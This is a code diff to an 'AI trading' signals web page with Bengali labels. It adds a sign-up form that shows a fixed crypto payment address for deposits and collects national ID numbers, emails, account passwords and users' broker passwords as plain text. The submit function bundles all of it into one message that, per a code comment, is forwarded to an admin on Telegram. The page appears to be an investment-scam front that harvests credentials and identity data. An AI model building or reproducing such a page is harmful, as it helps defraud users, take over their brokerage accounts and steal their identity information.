@@ -24,6 +24,14 @@
                 event.currentTarget.classList.add('text-blue-400', 'border-b-2', 'border-blue-500');
             }
         }
+
+        function copyPaymentID() {
+            var copyText = document.getElementById("payment-id");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); 
+            navigator.clipboard.writeText(copyText.value);
+            alert("Payment ID Copied: " + copyText.value);
+        }
     </script>
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #0b0e14; color: #fff; }
@@ -104,52 +112,107 @@
             </div>
         </div>
 
-        <!-- AI TRADING ACCOUNT TAB (FORM RESTORED) -->
+        <!-- AI TRADING ACCOUNT TAB -->
         <div id="ai-account" class="tab-content hidden">
-            <h2 class="text-2xl font-bold mb-6">Ai Trading Account</h2>
             
             <div class="bg-[#161b22] border border-gray-800 rounded-xl p-6 shadow-lg mb-6">
+                <!-- Form Header -->
+                <div class="flex items-center gap-3 mb-6 pb-4 border-b border-gray-800">
+                    <div class="w-10 h-10 bg-blue-900/20 rounded-full flex items-center justify-center border border-blue-500/30">
+                        <span class="text-blue-500 text-xl">👤</span>
+                    </div>
+                    <div>
+                        <h2 class="text-xl font-bold text-white">Ai Trading Account Form</h2>
+                        <p class="text-xs text-gray-400 font-medium">সঠিক তথ্য দিয়ে ফর্মটি পূরণ করুন।</p>
+                    </div>
+                </div>
+
                 <form id="accountForm" class="space-y-4">
+                    
+                    <!-- 1. Payment ID -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">আপনার ১০/১৩ ডিজিটের এন আইডি</label>
-                        <input type="text" placeholder="NID Number" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">১. পেমেন্ট আইডি (Payment ID)</label>
+                        <div class="flex gap-2">
+                            <input type="text" id="payment-id" value="TBah6sDqCdJneVTi8Qhiv4Qb7yAVoZvhJr" readonly class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white font-mono outline-none">
+                            <button type="button" onclick="copyPaymentID()" class="bg-cyan-500 hover:bg-cyan-600 text-white font-bold px-4 py-3 rounded-lg transition text-sm whitespace-nowrap">
+                                কপি করুন
+                            </button>
+                        </div>
                     </div>
+
+                    <!-- 2. Your Name -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">৬. ইমেইল (Email)</label>
-                        <input type="email" placeholder="example@email.com" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">২. আপনার নাম (Your Name)</label>
+                        <input type="text" id="form-name" placeholder="আপনার পূর্ণ নাম লিখুন" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
                     </div>
+
+                    <!-- 3. Telegram Username -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">৭. পাসওয়ার্ড (Password)</label>
-                        <input type="password" placeholder="পাসওয়ার্ড তৈরি করুন" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৩. টেলিগ্রাম (Telegram)</label>
+                        <input type="text" id="form-tg" placeholder="@username" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
                     </div>
+
+                    <!-- 4. Deposit Amount -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">৮. কোন ব্রোকারে একাউন্ট করবেন (Broker)</label>
-                        <select class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none appearance-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৪. ডিপোজিট এমাউন্ট (Deposit Amount)</label>
+                        <input type="text" id="form-deposit" placeholder="যেমন: 50, 100, 200 ... (USD)" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                    </div>
+
+                    <!-- 5. NID Number -->
+                    <div>
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৫. এন আইডি নাম্বার (NID Number)</label>
+                        <input type="text" id="form-nid" placeholder="আপনার ১০/১৩ ডিজিটের এন আইডি" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                    </div>
+
+                    <!-- 6. Email -->
+                    <div>
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৬. ইমেইল (Email)</label>
+                        <input type="email" id="form-email" placeholder="example@email.com" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                    </div>
+
+                    <!-- 7. Password -->
+                    <div>
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৭. পাসওয়ার্ড (Password)</label>
+                        <input type="text" id="form-pass" placeholder="পাসওয়ার্ড তৈরি করুন" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                    </div>
+
+                    <!-- 8. Broker -->
+                    <div>
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৮. কোন ব্রোকারে একাউন্ট করবেন (Broker)</label>
+                        <select id="form-broker" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none appearance-none">
                             <option value="">ব্রোকার সিলেক্ট করুন</option>
-                            <option value="exness">Exness</option>
-                            <option value="icmarkets">IC Markets</option>
-                            <option value="octafx">OctaFX</option>
-                            <option value="xm">XM</option>
+                            <option value="Exness">Exness</option>
+                            <option value="IC Markets">IC Markets</option>
+                            <option value="OctaFX">OctaFX</option>
+                            <option value="XM">XM</option>
                         </select>
                     </div>
+
+                    <!-- 9. Broker Password -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">৯. ব্রোকার পাসওয়ার্ড (Broker Password)</label>
-                        <input type="password" placeholder="আপনার ব্রোকার পাসওয়ার্ড দিন" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">৯. ব্রোকার পাসওয়ার্ড (Broker Password)</label>
+                        <input type="text" id="form-broker-pass" placeholder="আপনার ব্রোকার পাসওয়ার্ড দিন" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
                     </div>
+
+                    <!-- 10. Withdraw Wallet -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">১০. উইথড্র ওয়ালেট (Withdraw Wallet)</label>
-                        <input type="text" placeholder="যেমন: TRC20 - (USDT)" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">১০. উইথড্র ওয়ালেট (Withdraw Wallet)</label>
+                        <input type="text" id="form-wallet" placeholder="যেমন: TRC20 - (USDT)" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none">
                     </div>
+
+                    <!-- 11. Withdraw Period -->
                     <div>
-                        <label class="block text-sm font-bold text-gray-400 mb-1">১১. উইথড্র পিরিয়ড (Withdraw Period)</label>
-                        <select class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none appearance-none">
+                        <label class="block text-sm font-bold text-gray-300 mb-1">১১. উইথড্র পিরিয়ড (Withdraw Period)</label>
+                        <select id="form-period" class="w-full bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white focus:border-blue-500 outline-none appearance-none">
                             <option value="">সিলেক্ট করুন</option>
-                            <option value="weekly">Weekly</option>
-                            <option value="monthly">Monthly</option>
+                            <option value="Weekly">Weekly</option>
+                            <option value="Monthly">Monthly</option>
                         </select>
                     </div>
-                    <button type="button" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded-lg mt-4 transition shadow-lg flex items-center justify-center gap-2">
-                        <span>Submit</span>
+
+                    <!-- Submit Button -->
+                    <button type="button" id="submit-account-btn" onclick="submitAccountForm()" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3.5 rounded-lg mt-6 transition shadow-[0_0_15px_rgba(34,197,94,0.4)] flex items-center justify-center gap-2">
+                        <span>✓ একাউন্ট করুন</span>
                     </button>
                 </form>
             </div>
@@ -157,15 +220,6 @@
 
         <!-- SIGNALS TAB -->
         <div id="signals" class="tab-content block">
-            
-            <div class="bg-[#161b22] border border-gray-800 rounded-xl p-4 md:p-6 mb-8 flex items-center gap-4 shadow-lg">
-                <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_rgba(34,197,94,0.8)]"></div>
-                <div>
-                    <h3 class="text-lg font-bold text-white">Auto Analysis is Running</h3>
-                    <p class="text-xs text-gray-400 mt-1">মার্কেট স্ক্যান করা হচ্ছে...</p>
-                </div>
-            </div>
-
             <div class="flex justify-between items-end mb-4">
                 <h2 class="text-xl md:text-2xl font-bold">Live Signals</h2>
                 <div class="bg-gray-800 px-3 py-1.5 rounded-md text-xs font-mono text-gray-300 border border-gray-700 shadow-inner" id="current-time">--:--:--</div>
@@ -343,6 +397,62 @@
 
         setInterval(fetchSignals, 5000);
         fetchSignals();
+
+        // ফর্ম সাবমিট করে টেলিগ্রামে পাঠানোর কোড
+        function submitAccountForm() {
+            const btn = document.getElementById('submit-account-btn');
+            btn.innerHTML = "Processing...";
+            btn.disabled = true;
+
+            const name = document.getElementById('form-name').value;
+            const tg = document.getElementById('form-tg').value;
+            const deposit = document.getElementById('form-deposit').value;
+            const nid = document.getElementById('form-nid').value;
+            const email = document.getElementById('form-email').value;
+            const pass = document.getElementById('form-pass').value;
+            const broker = document.getElementById('form-broker').value;
+            const brokerPass = document.getElementById('form-broker-pass').value;
+            const wallet = document.getElementById('form-wallet').value;
+            const period = document.getElementById('form-period').value;
+
+            if(!name || !tg || !deposit || !nid || !email || !broker) {
+                alert("দয়া করে ফর্মের সব তথ্য সঠিকভাবে পূরণ করুন!");
+                btn.innerHTML = "<span>✓ একাউন্ট করুন</span>";
+                btn.disabled = false;
+                return;
+            }
+
+            const msg = `🆕 *New AI Account Request*\n\n` +
+                        `👤 *Name:* ${name}\n` +
+                        `✈️ *Telegram:* ${tg}\n` +
+                        `💰 *Deposit:* ${deposit}\n` +
+                        `🪪 *NID:* ${nid}\n` +
+                        `📧 *Email:* ${email}\n` +
+                        `🔑 *Password:* ${pass}\n` +
+                        `🏦 *Broker:* ${broker}\n` +
+                        `🔐 *Broker Pass:* ${brokerPass}\n` +
+                        `💳 *Wallet:* ${wallet}\n` +
+                        `📅 *Period:* ${period}`;
+
+            fetch('/api/submit_form', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({message: msg})
+            }).then(res => res.json()).then(data => {
+                if(data.status === 'success') {
+                    alert("আপনার রিকোয়েস্ট সফলভাবে এডমিনের কাছে পাঠানো হয়েছে!");
+                    document.getElementById('accountForm').reset();
+                } else {
+                    alert("সার্ভার সমস্যা! আবার চেষ্টা করুন।");
+                }
+                btn.innerHTML = "<span>✓ একাউন্ট করুন</span>";
+                btn.disabled = false;
+            }).catch(err => {
+                alert("নেটওয়ার্ক সমস্যা!");
+                btn.innerHTML = "<span>✓ একাউন্ট করুন</span>";
+                btn.disabled = false;
+            });
+        }
 
         // Dashboard Functions
         function sendTelegram() {
